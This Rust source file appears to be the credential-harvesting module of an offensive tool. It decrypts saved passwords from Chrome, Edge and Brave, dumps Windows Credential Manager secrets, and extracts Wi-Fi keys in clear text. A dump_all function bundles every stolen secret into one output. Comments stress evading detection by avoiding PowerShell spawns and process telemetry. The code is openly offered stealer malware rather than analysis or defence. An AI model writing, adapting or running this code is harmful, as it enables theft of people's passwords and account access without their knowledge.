//! dpapi.rs — DPAPI credential harvesting
//!
//! Harvests:
//!   1. Chrome/Edge/Brave saved passwords  (Login Data SQLite, DPAPI + AES-GCM)
//!   2. Windows Credential Manager         (CredEnumerateW)
//!   3. Wi-Fi PSKs                         (netsh wlan show profile ... key=clear)
//!
//! Chrome v80+ AES-GCM decryption is done entirely in-process via BCryptDecrypt
//! (LoadLibrary hash-resolved bcrypt.dll) — zero powershell.exe spawns,
//! zero subprocess lineage telemetry.

use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;
use winapi::shared::minwindef::DWORD;
use winapi::um::dpapi::{CryptUnprotectData, CRYPTOAPI_BLOB};
use winapi::um::wincred::{CredEnumerateW, CredFree, PCREDENTIALW};

// ── BCrypt type aliases ───────────────────────────────────────────────────
type BCRYPT_ALG_HANDLE  = *mut std::ffi::c_void;
type BCRYPT_KEY_HANDLE  = *mut std::ffi::c_void;
type NTSTATUS           = i32;
const STATUS_SUCCESS: NTSTATUS = 0;

// BCRYPT_AES_GCM_PADDING_INFO (passed as pPaddingInfo with dwFlags=BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG)
#[repr(C)]
struct BcryptAuthenticatedCipherModeInfo {
    cbSize:          u32,
    dwInfoVersion:   u32,
    pbNonce:         *mut u8,
    cbNonce:         u32,
    pbAuthData:      *mut u8,
    cbAuthData:      u32,
    pbTag:           *mut u8,
    cbTag:           u32,
    pbMacContext:    *mut u8,
    cbMacContext:    u32,
    cbAAD:           u32,
    cbData:          u64,
    dwFlags:         u32,
}

const BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG: u32 = 0x00000001;
const BCRYPT_AUTH_TAG_LENGTH_STRUCT:     u32 = 0x00000008;

// Function pointer types loaded from bcrypt.dll at runtime
type FnBCryptOpenAlgorithmProvider = unsafe extern "system" fn(
    phAlgorithm: *mut BCRYPT_ALG_HANDLE,
    pszAlgId:    *const u16,
    pszImpl:     *const u16,
    dwFlags:     DWORD,
) -> NTSTATUS;

type FnBCryptImportKey = unsafe extern "system" fn(
    hAlgorithm:    BCRYPT_ALG_HANDLE,
    hImportKey:    BCRYPT_KEY_HANDLE,
    pszBlobType:   *const u16,
    phKey:         *mut BCRYPT_KEY_HANDLE,
    pbKeyObject:   *mut u8,
    cbKeyObject:   DWORD,
    pbInput:       *const u8,
    cbInput:       DWORD,
    dwFlags:       DWORD,
) -> NTSTATUS;

type FnBCryptDecrypt = unsafe extern "system" fn(
    hKey:          BCRYPT_KEY_HANDLE,
    pbInput:       *const u8,
    cbInput:       DWORD,
    pPaddingInfo:  *mut std::ffi::c_void,
    pbIV:          *mut u8,
    cbIV:          DWORD,
    pbOutput:      *mut u8,
    cbOutput:      DWORD,
    pcbResult:     *mut DWORD,
    dwFlags:       DWORD,
) -> NTSTATUS;

type FnBCryptDestroyKey   = unsafe extern "system" fn(hKey: BCRYPT_KEY_HANDLE) -> NTSTATUS;
type FnBCryptCloseProvider = unsafe extern "system" fn(hAlgorithm: BCRYPT_ALG_HANDLE, dwFlags: DWORD) -> NTSTATUS;
type FnBCryptSetProperty  = unsafe extern "system" fn(
    hObject:   *mut std::ffi::c_void,
    pszProperty: *const u16,
    pbInput:   *const u8,
    cbInput:   DWORD,
    dwFlags:   DWORD,
) -> NTSTATUS;

/// Load bcrypt.dll at runtime and return AES-128-GCM decrypted plaintext.
/// key: 16 bytes, nonce: 12 bytes, ciphertext includes 16-byte GCM tag at the end.
unsafe fn bcrypt_aes_gcm_decrypt_native(
    key:        &[u8],
    nonce:      &[u8],
    ciphertext: &[u8],  // last 16 bytes = GCM auth tag
) -> Option<Vec<u8>> {
    if ciphertext.len() < 16 { return None; }
    let ct_len  = ciphertext.len() - 16;
    let tag     = &ciphertext[ct_len..];
    let ct_body = &ciphertext[..ct_len];

    // Load bcrypt.dll via hash-resolved LoadLibrary — zero static import
    let bcrypt_dll = winapi::um::libloaderapi::LoadLibraryA(
        b"bcrypt.dll\0".as_ptr() as _
    );
    if bcrypt_dll.is_null() { return None; }

    macro_rules! get_proc {
        ($lib:expr, $name:expr, $ty:ty) => {{
            let fp = winapi::um::libloaderapi::GetProcAddress($lib, $name.as_ptr() as _);
            if fp.is_null() { return None; }
            std::mem::transmute::<_, $ty>(fp)
        }}
    }

    let fn_open:     FnBCryptOpenAlgorithmProvider =
        get_proc!(bcrypt_dll, b"BCryptOpenAlgorithmProvider\0", FnBCryptOpenAlgorithmProvider);
    let fn_import:   FnBCryptImportKey  =
        get_proc!(bcrypt_dll, b"BCryptImportKey\0",  FnBCryptImportKey);
    let fn_decrypt:  FnBCryptDecrypt    =
        get_proc!(bcrypt_dll, b"BCryptDecrypt\0",    FnBCryptDecrypt);
    let fn_destroy:  FnBCryptDestroyKey =
        get_proc!(bcrypt_dll, b"BCryptDestroyKey\0", FnBCryptDestroyKey);
    let fn_close:    FnBCryptCloseProvider =
        get_proc!(bcrypt_dll, b"BCryptCloseAlgorithmProvider\0", FnBCryptCloseProvider);
    let fn_setprop:  FnBCryptSetProperty =
        get_proc!(bcrypt_dll, b"BCryptSetProperty\0", FnBCryptSetProperty);

    // Wide string helpers
    let w = |s: &str| -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() };
    let aes_w   = w("AES");
    let gcm_w   = w("ChainingModeGCM");
    let chain_w = w("ChainingMode");
    let raw_w   = w("BCRYPTBLOBTYPE");
    let keydata_w = w("KeyDataBlob");

    // Open AES provider
    let mut h_alg: BCRYPT_ALG_HANDLE = std::ptr::null_mut();
    if fn_open(
        &mut h_alg, aes_w.as_ptr(), std::ptr::null(), 0
    ) != STATUS_SUCCESS { return None; }

    // Set chaining mode to GCM
    let gcm_mode_bytes: Vec<u8> = gcm_w.iter()
        .flat_map(|&w| w.to_le_bytes())
        .collect();
    fn_setprop(
        h_alg as _, chain_w.as_ptr(),
        gcm_mode_bytes.as_ptr(), gcm_mode_bytes.len() as DWORD, 0,
    );

    // Build BCRYPT_KEY_DATA_BLOB_HEADER + key material
    // Header: Magic(u32) = 0x4d42444b, Version(u32) = 1, cbKeyData(u32) = key_len
    let mut key_blob: Vec<u8> = Vec::with_capacity(12 + key.len());
    key_blob.extend_from_slice(&0x4d42444b_u32.to_le_bytes()); // BCRYPT_KEY_DATA_BLOB_MAGIC
    key_blob.extend_from_slice(&1_u32.to_le_bytes());           // Version
    key_blob.extend_from_slice(&(key.len() as u32).to_le_bytes());
    key_blob.extend_from_slice(key);

    let mut key_obj = vec![0u8; 512]; // generous object buffer
    let mut h_key: BCRYPT_KEY_HANDLE = std::ptr::null_mut();
    let import_ok = fn_import(
        h_alg, std::ptr::null_mut(), keydata_w.as_ptr(),
        &mut h_key, key_obj.as_mut_ptr(), key_obj.len() as DWORD,
        key_blob.as_ptr(), key_blob.len() as DWORD, 0,
    );
    if import_ok != STATUS_SUCCESS {
        fn_close(h_alg, 0);
        return None;
    }

    // Build BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
    let mut nonce_buf = nonce.to_vec();
    let mut tag_buf   = tag.to_vec();
    let mut auth_info = BcryptAuthenticatedCipherModeInfo {
        cbSize:       std::mem::size_of::<BcryptAuthenticatedCipherModeInfo>() as u32,
        dwInfoVersion: 1,
        pbNonce:      nonce_buf.as_mut_ptr(),
        cbNonce:      nonce_buf.len() as u32,
        pbAuthData:   std::ptr::null_mut(),
        cbAuthData:   0,
        pbTag:        tag_buf.as_mut_ptr(),
        cbTag:        tag_buf.len() as u32,
        pbMacContext: std::ptr::null_mut(),
        cbMacContext: 0,
        cbAAD:        0,
        cbData:       0,
        dwFlags:      0,
    };

    let mut plaintext = vec![0u8; ct_len];
    let mut result_len: DWORD = 0;

    let decrypt_ok = fn_decrypt(
        h_key,
        ct_body.as_ptr(),
        ct_len as DWORD,
        &mut auth_info as *mut _ as *mut std::ffi::c_void,
        std::ptr::null_mut(), 0,
        plaintext.as_mut_ptr(),
        plaintext.len() as DWORD,
        &mut result_len,
        0,
    );

    fn_destroy(h_key);
    fn_close(h_alg, 0);

    if decrypt_ok == STATUS_SUCCESS {
        plaintext.truncate(result_len as usize);
        Some(plaintext)
    } else {
        None
    }
}

// ── Public harvest API ────────────────────────────────────────────────────

#[derive(Debug)]
pub struct HarvestedCred {
    pub source:   String,
    pub target:   String,
    pub username: String,
    pub secret:   String,
}

pub fn harvest_credential_manager() -> Vec<HarvestedCred> {
    let mut out = Vec::new();
    unsafe {
        let mut count: DWORD = 0;
        let mut creds: *mut PCREDENTIALW = std::ptr::null_mut();
        if CredEnumerateW(std::ptr::null(), 0, &mut count, &mut creds) == 0 { return out; }
        for i in 0..(count as usize) {
            let c = &**creds.add(i);
            let target   = wstr(c.TargetName);
            let username = wstr(c.UserName);
            let secret = if c.CredentialBlobSize > 0 && !c.CredentialBlob.is_null() {
                dpapi_decrypt(c.CredentialBlob, c.CredentialBlobSize as usize)
                    .and_then(|b| String::from_utf8(b).ok())
                    .unwrap_or_else(|| "<binary>".into())
            } else { String::new() };
            out.push(HarvestedCred { source: "CredMan".into(), target, username, secret });
        }
        CredFree(creds as _);
    }
    out
}

pub fn harvest_browser_logins() -> Vec<HarvestedCred> {
    let mut out = Vec::new();
    let appdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
    let profiles = [
        format!(r"{}\Google\Chrome\User Data\Default\Login Data", appdata),
        format!(r"{}\Microsoft\Edge\User Data\Default\Login Data", appdata),
        format!(r"{}\BraveSoftware\Brave-Browser\User Data\Default\Login Data", appdata),
    ];
    for db_path in &profiles {
        if !std::path::Path::new(db_path).exists() { continue; }
        let tmp = format!(r"{}\redcrab_tmp.db", std::env::temp_dir().to_string_lossy());
        if std::fs::copy(db_path, &tmp).is_err() { continue; }
        if let Ok(rows) = query_login_data(&tmp) {
            for (url, user, enc_pass) in rows {
                let pass = decrypt_chrome_password(&enc_pass, &appdata)
                    .unwrap_or_else(|| "<decrypt_failed>".into());
                out.push(HarvestedCred { source: "Browser".into(), target: url, username: user, secret: pass });
            }
        }
        let _ = std::fs::remove_file(&tmp);
    }
    out
}

pub fn harvest_wifi_psks() -> Vec<HarvestedCred> {
    let mut out = Vec::new();
    let list = std::process::Command::new("netsh")
        .args(["wlan", "show", "profiles"])
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default();
    for line in list.lines() {
        if let Some(pos) = line.find(':') {
            let profile = line[pos+1..].trim().to_string();
            if profile.is_empty() { continue; }
            let detail = std::process::Command::new("netsh")
                .args(["wlan", "show", "profile", &profile, "key=clear"])
                .output()
                .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                .unwrap_or_default();
            for dl in detail.lines() {
                if dl.contains("Key Content") {
                    if let Some(p) = dl.find(':') {
                        out.push(HarvestedCred {
                            source: "WiFi".into(), target: profile.clone(),
                            username: String::new(), secret: dl[p+1..].trim().to_string(),
                        });
                    }
                }
            }
        }
    }
    out
}

pub fn dump_all() -> Vec<u8> {
    harvest_credential_manager()
        .into_iter()
        .chain(harvest_browser_logins())
        .chain(harvest_wifi_psks())
        .map(|c| format!("[{}] {} | {} | {}\n", c.source, c.target, c.username, c.secret))
        .collect::<String>()
        .into_bytes()
}

pub fn base64_decode_pub(s: &str) -> Option<Vec<u8>> { base64_decode(s) }

// ── Internals ─────────────────────────────────────────────────────────────

unsafe fn dpapi_decrypt(data: *const u8, len: usize) -> Option<Vec<u8>> {
    let mut blob_in  = CRYPTOAPI_BLOB { cbData: len as DWORD, pbData: data as *mut u8 };
    let mut blob_out: CRYPTOAPI_BLOB = std::mem::zeroed();
    if CryptUnprotectData(
        &mut blob_in, std::ptr::null_mut(), std::ptr::null_mut(),
        std::ptr::null_mut(), std::ptr::null_mut(), 0, &mut blob_out,
    ) == 0 { return None; }
    let v = std::slice::from_raw_parts(blob_out.pbData, blob_out.cbData as usize).to_vec();
    winapi::um::winbase::LocalFree(blob_out.pbData as _);
    Some(v)
}

fn wstr(p: *const u16) -> String {
    if p.is_null() { return String::new(); }
    unsafe {
        let len = (0..).take_while(|&i| *p.add(i) != 0).count();
        OsString::from_wide(std::slice::from_raw_parts(p, len))
            .to_string_lossy().into_owned()
    }
}

fn query_login_data(path: &str) -> Result<Vec<(String, String, Vec<u8>)>, ()> {
    let out = std::process::Command::new("sqlite3")
        .args([path, "-separator", "\x1F",
               "SELECT origin_url,username_value,password_value FROM logins"])
        .output().map_err(|_| ())?;
    let mut rows = Vec::new();
    for line in String::from_utf8_lossy(&out.stdout).lines() {
        let parts: Vec<&str> = line.splitn(3, '\x1F').collect();
        if parts.len() == 3 {
            rows.push((
                parts[0].to_string(),
                parts[1].to_string(),
                parts[2].as_bytes().to_vec(),
            ));
        }
    }
    Ok(rows)
}

fn decrypt_chrome_password(enc: &[u8], appdata: &str) -> Option<String> {
    if enc.starts_with(b"v10") || enc.starts_with(b"v11") {
        // AES-128-GCM path — native BCrypt, no subprocess
        let key   = get_chrome_aes_key(appdata)?;
        let nonce = &enc[3..15];       // 12-byte nonce after "v10" prefix
        let ct    = &enc[15..];        // ciphertext + 16-byte tag
        unsafe { bcrypt_aes_gcm_decrypt_native(&key, nonce, ct) }
            .and_then(|b| String::from_utf8(b).ok())
    } else {
        // Legacy DPAPI blob
        unsafe { dpapi_decrypt(enc.as_ptr(), enc.len()) }
            .and_then(|b| String::from_utf8(b).ok())
    }
}

fn get_chrome_aes_key(appdata: &str) -> Option<Vec<u8>> {
    let ls_path = format!(r"{}\Google\Chrome\User Data\Local State", appdata);
    let raw = std::fs::read_to_string(ls_path).ok()?;
    // Manual JSON key extraction — no serde dep
    let key_str = raw.split("\"encrypted_key\":\"").nth(1)?.split('"').next()?;
    let decoded = base64_decode(key_str)?;
    if decoded.len() < 5 { return None; }
    // First 5 bytes are "DPAPI" magic prefix
    unsafe { dpapi_decrypt(decoded[5..].as_ptr(), decoded.len() - 5) }
}

/// Minimal base64 decoder — no external crate
fn base64_decode(s: &str) -> Option<Vec<u8>> {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let bytes: Vec<u8> = s.bytes().filter(|&b| b != b'=').collect();
    let mut out = Vec::with_capacity(bytes.len() * 3 / 4);
    let idx = |b: u8| T.iter().position(|&x| x == b).unwrap_or(0) as u32;
    let mut i = 0;
    while i + 3 < bytes.len() {
        let (a, b, c, d) = (idx(bytes[i]), idx(bytes[i+1]), idx(bytes[i+2]), idx(bytes[i+3]));
        out.push(((a << 2) | (b >> 4)) as u8);
        out.push(((b << 4) | (c >> 2)) as u8);
        out.push(((c << 6) | d) as u8);
        i += 4;
    }
    Some(out)
}
